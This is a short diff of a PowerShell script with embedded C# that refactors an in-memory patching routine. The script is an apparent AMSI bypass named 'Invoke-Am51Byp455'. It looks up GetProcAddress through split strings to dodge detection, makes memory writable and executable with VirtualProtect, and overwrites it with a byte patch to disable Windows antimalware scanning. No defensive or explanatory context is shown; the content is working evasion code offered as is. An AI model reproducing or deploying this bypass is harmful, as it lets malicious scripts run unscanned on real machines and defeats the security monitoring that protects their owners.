@@ -5,7 +5,7 @@ using System.Runtime.InteropServices;
 
 public class Win32 {
 
-	public class MemoryOperations {
+
     public static void WriteToMemory(byte[] patch, IntPtr address) {
         unsafe {
             fixed (byte* p = patch) {
@@ -15,7 +15,8 @@ public class Win32 {
                 }
             }
         }
-    }
+	}
+    
 
     [DllImport("kernel32",EntryPoint="Get"+"Proc"+"Address")]
     public static extern IntPtr gpa(IntPtr hModule, string procName);
@@ -49,7 +50,6 @@ function Invoke-Am51Byp455{
 		$p = 0
 		[Win32]::vp($Address, [uint32]4, 0x40, [ref]$p)
 		$Patch = [Byte[]] (0x4C,0x8B,0xDC,0xC3)
-		[MemoryOperations]::WriteToMemory($patch, $address)
+		[Win32]::WriteToMemory($patch, $address)
     }
-
 }
